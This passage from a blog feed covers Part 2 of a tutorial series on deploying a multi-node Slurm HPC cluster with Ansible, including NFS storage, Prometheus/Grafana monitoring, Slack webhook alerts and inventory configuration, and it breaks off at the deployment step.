<li class=""><strong>Part 2</strong>: <a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2">Production Deployment</a></li>
<li class=""><strong>Documentation</strong>: <a class="" href="https://riverxdata.github.io/river-docs/docs/resources/high-performance-computing/how-to-build-slurm-scalable-using-ansible/administration">Administration Guide</a></li>
<li class=""><strong>GitHub</strong>: <a href="https://github.com/riverxdata/river-slurm" target="_blank" rel="noopener noreferrer" class="">RiverXData Slurm Ansible</a></li>
<li class=""><strong>Official Docs</strong>: <a href="https://slurm.schedmd.com/" target="_blank" rel="noopener noreferrer" class="">SchedMD Slurm Documentation</a></li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="contact">Contact<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#contact" class="hash-link" aria-label="Direct link to Contact" title="Direct link to Contact" translate="no">​</a></h2>
<p>Have questions or need help with your cluster? Reach out at: <a href="mailto:nttg8100@gmail.com" target="_blank" rel="noopener noreferrer" class="">nttg8100@gmail.com</a></p>
<hr>
<p><em>This concludes the RiverXData series on building Slurm HPC clusters. Thank you for following along! We hope this guide helps you build and manage effective HPC infrastructure.</em></p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="slurm" term="slurm"/>
        <category label="hpc" term="hpc"/>
        <category label="administration" term="administration"/>
        <category label="security" term="security"/>
        <category label="best-practices" term="best-practices"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Building a Slurm HPC Cluster (Part 2) - Scaling to Production with Ansible]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2</id>
        <link href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2"/>
        <updated>2026-01-12T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[In Part 1, we learned the fundamentals by building a single-node Slurm cluster. Now it's time to scale up to a production-ready, multi-node cluster with automated deployment, monitoring, and alerting.]]></summary>
        <content type="html"><![CDATA[<p>In <a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1">Part 1</a>, we learned the fundamentals by building a single-node Slurm cluster. Now it's time to scale up to a production-ready, multi-node cluster with automated deployment, monitoring, and alerting.</p>
<p>In this post, we'll use Ansible to automate the entire deployment process, making it reproducible and maintainable.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="series-overview">Series Overview<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#series-overview" class="hash-link" aria-label="Direct link to Series Overview" title="Direct link to Series Overview" translate="no">​</a></h2>
<ul>
<li class=""><strong><a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1">Part 1</a></strong>: Introduction, Architecture, and Single Node Setup</li>
<li class=""><strong>Part 2 (This Post)</strong>: Scaling to Production with Ansible</li>
<li class=""><strong><a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3">Part 3</a></strong>: Administration and Best Practices</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-ansible-for-hpc-clusters">Why Ansible for HPC Clusters?<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#why-ansible-for-hpc-clusters" class="hash-link" aria-label="Direct link to Why Ansible for HPC Clusters?" title="Direct link to Why Ansible for HPC Clusters?" translate="no">​</a></h2>
<p>Moving from a single-node setup to a multi-node production cluster involves:</p>
<ul>
<li class="">Configuring multiple machines identically</li>
<li class="">Managing dependencies and installation order</li>
<li class="">Keeping configurations synchronized</li>
<li class="">Handling user management across nodes</li>
<li class="">Setting up monitoring and logging infrastructure</li>
</ul>
<p>Doing this manually is error-prone and time-consuming. Infrastructure automation tools like Ansible, Puppet, or Terraform solve this problem. We chose <strong>Ansible</strong> because:</p>
<ul>
<li class=""><strong>Agentless</strong>: No software to install on managed nodes</li>
<li class=""><strong>Declarative</strong>: Describe the desired state, not the steps</li>
<li class=""><strong>Idempotent</strong>: Safe to run multiple times</li>
<li class=""><strong>YAML-based</strong>: Easy to read and version control</li>
<li class=""><strong>Large ecosystem</strong>: Many pre-built roles available</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-ansible-quick-primer">What is Ansible? (Quick Primer)<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#what-is-ansible-quick-primer" class="hash-link" aria-label="Direct link to What is Ansible? (Quick Primer)" title="Direct link to What is Ansible? (Quick Primer)" translate="no">​</a></h3>
<p>If you're new to Ansible, watch this excellent 100-second introduction:</p>
<div style="position:relative;padding-bottom:56.25%;height:0;overflow:hidden;max-width:100%;background:#000"><iframe src="https://www.youtube.com/embed/xRMPKQweySE" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="production-cluster-architecture">Production Cluster Architecture<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#production-cluster-architecture" class="hash-link" aria-label="Direct link to Production Cluster Architecture" title="Direct link to Production Cluster Architecture" translate="no">​</a></h2>
<p>Our production setup includes these components:</p>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Small HPC Cluster" src="https://riverxdata.github.io/river-docs/assets/images/small_HPC-ee51275c1193ebc8a4abe061b1fafbc6.jpg" width="1386" height="933" class="img_ev3q"></p></figure>
<p>Source: <a href="https://cs.phenikaa-uni.edu.vn/vi/post/gioi-thieu/co-so-vat-chat/he-thong-tinh-toan-hieu-nang-cao-phenikaa-hpc" target="_blank" rel="noopener noreferrer" class="">https://cs.phenikaa-uni.edu.vn/vi/post/gioi-thieu/co-so-vat-chat/he-thong-tinh-toan-hieu-nang-cao-phenikaa-hpc</a></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="head-node-controller--login">Head Node (Controller + Login)<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#head-node-controller--login" class="hash-link" aria-label="Direct link to Head Node (Controller + Login)" title="Direct link to Head Node (Controller + Login)" translate="no">​</a></h3>
<p>The head node manages the cluster and provides user access:</p>
<ul>
<li class=""><strong>slurmctld</strong>: Job scheduling and resource management</li>
<li class=""><strong>slurmdbd</strong>: Accounting database</li>
<li class=""><strong>NFS Server</strong>: Shares directories to compute nodes</li>
<li class=""><strong>Prometheus</strong>: Metrics collection</li>
<li class=""><strong>Grafana</strong>: Monitoring dashboards</li>
<li class=""><strong>Alertmanager</strong>: Slack notifications</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="compute-nodes">Compute Nodes<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#compute-nodes" class="hash-link" aria-label="Direct link to Compute Nodes" title="Direct link to Compute Nodes" translate="no">​</a></h3>
<p>Worker nodes that execute jobs:</p>
<ul>
<li class=""><strong>slurmd</strong>: Job execution daemon</li>
<li class=""><strong>NFS Client</strong>: Mounts shared storage</li>
<li class=""><strong>Node Exporter</strong>: Exposes system metrics</li>
<li class=""><strong>Slurm Exporter</strong>: Exposes Slurm-specific metrics</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="shared-storage-nfs">Shared Storage (NFS)<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#shared-storage-nfs" class="hash-link" aria-label="Direct link to Shared Storage (NFS)" title="Direct link to Shared Storage (NFS)" translate="no">​</a></h3>
<p>NFS provides unified file system access across all nodes:</p>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="NFS Architecture" src="https://riverxdata.github.io/river-docs/assets/images/NFS-41d4079c304dac75689e6ecdc6063d02.png" width="1200" height="675" class="img_ev3q"></p></figure>
<p>Source: <a href="https://thuanbui.me/cai-dat-nfs-server-va-nfs-client-tren-ubuntu-22-04/" target="_blank" rel="noopener noreferrer" class="">https://thuanbui.me/cai-dat-nfs-server-va-nfs-client-tren-ubuntu-22-04/</a></p>
<ul>
<li class=""><code>/home</code>: User home directories (fast SSD/NVMe storage)</li>
<li class=""><code>/mnt/data</code>: Large datasets (high-capacity HDD)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="monitoring-stack">Monitoring Stack<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#monitoring-stack" class="hash-link" aria-label="Direct link to Monitoring Stack" title="Direct link to Monitoring Stack" translate="no">​</a></h3>
<p>Complete observability for your cluster:</p>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Grafana Dashboard" src="https://riverxdata.github.io/river-docs/assets/images/grafana-7dace9efecdbf46b14c5e25c659f17ad.png" width="1168" height="863" class="img_ev3q"></p></figure>
<p>Source: <a href="https://swsmith.cc/posts/grafana-slurm.html" target="_blank" rel="noopener noreferrer" class="">https://swsmith.cc/posts/grafana-slurm.html</a></p>
<ul>
<li class=""><strong>Prometheus</strong>: Time-series metrics database</li>
<li class=""><strong>Grafana</strong>: Beautiful dashboards for visualization</li>
<li class=""><strong>Alertmanager</strong>: Sends alerts to Slack when issues occur</li>
<li class=""><strong>Node Exporter</strong>: System-level metrics (CPU, memory, disk)</li>
<li class=""><strong>Slurm Exporter</strong>: Slurm-specific metrics (jobs, partitions, nodes)</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="setting-up-the-riverxdata-slurm-cluster">Setting Up the RiverXData Slurm Cluster<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#setting-up-the-riverxdata-slurm-cluster" class="hash-link" aria-label="Direct link to Setting Up the RiverXData Slurm Cluster" title="Direct link to Setting Up the RiverXData Slurm Cluster" translate="no">​</a></h2>
<p>We've created a comprehensive Ansible playbook that automates everything. Let's get started!</p>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Slurm Deployment Architecture" src="https://riverxdata.github.io/river-docs/assets/images/slurm-e2bd62c31ed705955e53c1a6cbfc917f.svg" class="img_ev3q"></p></figure>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="prerequisites">Prerequisites<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#prerequisites" class="hash-link" aria-label="Direct link to Prerequisites" title="Direct link to Prerequisites" translate="no">​</a></h3>
<ul>
<li class="">Multiple Ubuntu 20.04 or 24.04 machines (or VMs)</li>
<li class="">SSH access to all nodes</li>
<li class="">Sudo privileges on all nodes</li>
<li class="">A Slack workspace (for alerts)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-1-clone-the-repository">Step 1: Clone the Repository<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#step-1-clone-the-repository" class="hash-link" aria-label="Direct link to Step 1: Clone the Repository" title="Direct link to Step 1: Clone the Repository" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> clone https://github.com/riverxdata/river-slurm.git </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1.0</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> river-slurm</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-2-install-ansible-and-dependencies">Step 2: Install Ansible and Dependencies<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#step-2-install-ansible-and-dependencies" class="hash-link" aria-label="Direct link to Step 2: Install Ansible and Dependencies" title="Direct link to Step 2: Install Ansible and Dependencies" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Ubuntu 24.04, without Vagrant</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> scripts/setup.sh </span><span class="token number" style="color:hsl(35, 99%, 36%)">24.04</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># For Ubuntu 20.04</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> scripts/setup.sh </span><span class="token number" style="color:hsl(35, 99%, 36%)">20.04</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># For developers: Install with Vagrant support</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> scripts/setup.sh </span><span class="token number" style="color:hsl(35, 99%, 36%)">24.04</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><br></span></code></pre></div></div>
<p>This script installs:</p>
<ul>
<li class="">Ansible and required Python packages</li>
<li class="">Community Ansible collections</li>
<li class="">Galaxy roles (geerlingguy.docker, etc.)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-3-set-up-slack-alerts">Step 3: Set Up Slack Alerts<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#step-3-set-up-slack-alerts" class="hash-link" aria-label="Direct link to Step 3: Set Up Slack Alerts" title="Direct link to Step 3: Set Up Slack Alerts" translate="no">​</a></h3>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>In production environments, even small teams benefit from proactive monitoring. Slack is perfect for this - you'll get notifications when nodes go down, jobs fail, or resources run low.</p></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="create-a-slack-app">Create a Slack App<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#create-a-slack-app" class="hash-link" aria-label="Direct link to Create a Slack App" title="Direct link to Create a Slack App" translate="no">​</a></h4>
<ol>
<li class="">Go to <a href="https://api.slack.com/apps" target="_blank" rel="noopener noreferrer" class="">Slack API</a> and create a new app</li>
<li class="">Choose "From scratch"</li>
<li class="">Name it (e.g., "Slurm Cluster Monitor")</li>
<li class="">Select your workspace</li>
</ol>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Create Slack App" src="https://riverxdata.github.io/river-docs/assets/images/create_app-5f947edfa49ffbdf36fe676be2c07ec2.png" width="1093" height="731" class="img_ev3q"></p></figure>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="enable-incoming-webhooks">Enable Incoming Webhooks<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#enable-incoming-webhooks" class="hash-link" aria-label="Direct link to Enable Incoming Webhooks" title="Direct link to Enable Incoming Webhooks" translate="no">​</a></h4>
<ol>
<li class="">Navigate to "Incoming Webhooks" in your app settings</li>
<li class="">Activate incoming webhooks</li>
<li class="">Click "Add New Webhook to Workspace"</li>
<li class="">Select the channel for notifications (e.g., <code>#cluster-alerts</code>)</li>
<li class="">Copy the webhook URL</li>
</ol>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Slack Config Step 1" src="https://riverxdata.github.io/river-docs/assets/images/config_1-9d474b122b801e342837ef04c9f5830e.png" width="1093" height="1115" class="img_ev3q"></p></figure>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Slack Config Step 2" src="https://riverxdata.github.io/river-docs/assets/images/config_2-00d5027252e91dfd879cc3493c03dec6.png" width="1093" height="1115" class="img_ev3q"></p></figure>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Slack Config Step 3" src="https://riverxdata.github.io/river-docs/assets/images/config_3-d3746310237e6ce3e41c3e02e9659122.png" width="1093" height="1115" class="img_ev3q"></p></figure>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="test-your-webhook">Test Your Webhook<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#test-your-webhook" class="hash-link" aria-label="Direct link to Test Your Webhook" title="Direct link to Test Your Webhook" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-X</span><span class="token plain"> POST </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-H</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'Content-type: application/json'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--data</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'{"text":"Hello from Slurm cluster!"}'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  https://hooks.slack.com/services/YOUR/WEBHOOK/URL</span><br></span></code></pre></div></div>
<p>You should see the message appear in your Slack channel!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-4-configure-your-inventory">Step 4: Configure Your Inventory<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#step-4-configure-your-inventory" class="hash-link" aria-label="Direct link to Step 4: Configure Your Inventory" title="Direct link to Step 4: Configure Your Inventory" translate="no">​</a></h3>
<p>Create <code>inventories/hosts</code> (or copy from <code>inventories/hosts.example</code>):</p>
<div class="language-ini codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ini codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token section punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token section section-name selector" style="color:hsl(119, 34%, 47%)">slurm_master</span><span class="token section punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">controller-01 ansible_host</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">192.168.58.10</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token section punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token section section-name selector" style="color:hsl(119, 34%, 47%)">slurm_worker</span><span class="token section punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">worker-01 ansible_host</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">192.168.58.11</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">worker-02 ansible_host</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">192.168.58.12</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token section punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token section section-name selector" style="color:hsl(119, 34%, 47%)">slurm:children</span><span class="token section punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">slurm_master</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">slurm_worker</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token section punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token section section-name selector" style="color:hsl(119, 34%, 47%)">all:vars</span><span class="token section punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">ansible_user</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">your_username</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">slurm_password</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">secure_munge_password</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">slurm_account_db_pass</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">secure_db_password</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">slack_api_url</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">https://hooks.slack.com/services/YOUR/WEBHOOK/URL</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">slack_channel</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">#cluster-alerts</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">admin_user</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">admin</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">admin_password</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">secure_grafana_password</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>warning</div><div class="admonitionContent_BuS1"><p><strong>Security Best Practice</strong>: Use <a href="https://docs.ansible.com/ansible/latest/user_guide/vault.html" target="_blank" rel="noopener noreferrer" class="">Ansible Vault</a> to encrypt sensitive variables like passwords and API keys.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create encrypted vault</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ansible-vault create inventories/vault.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or encrypt existing file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ansible-vault encrypt inventories/hosts</span><br></span></code></pre></div></div></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="optional-parameters">Optional Parameters<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#optional-parameters" class="hash-link" aria-label="Direct link to Optional Parameters" title="Direct link to Optional Parameters" translate="no">​</a></h4>
<div class="language-ini codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ini codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">default_password</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">temporary_user_password  # Forces change on first login</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">users</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">alice,bob,charlie                   # Comma-separated list</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-5-deploy-the-cluster">Step 5: Deploy the Cluster<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#step-5-deploy-the-cluster" class="hash-link" aria-label="Direct link to Step 5: Deploy the Cluster" title="Direct link to Step 5: Deploy the Cluster" translate="no">​</a></h3>
<p>Now for the magic moment - deploy your entire cluster with one command!</p>
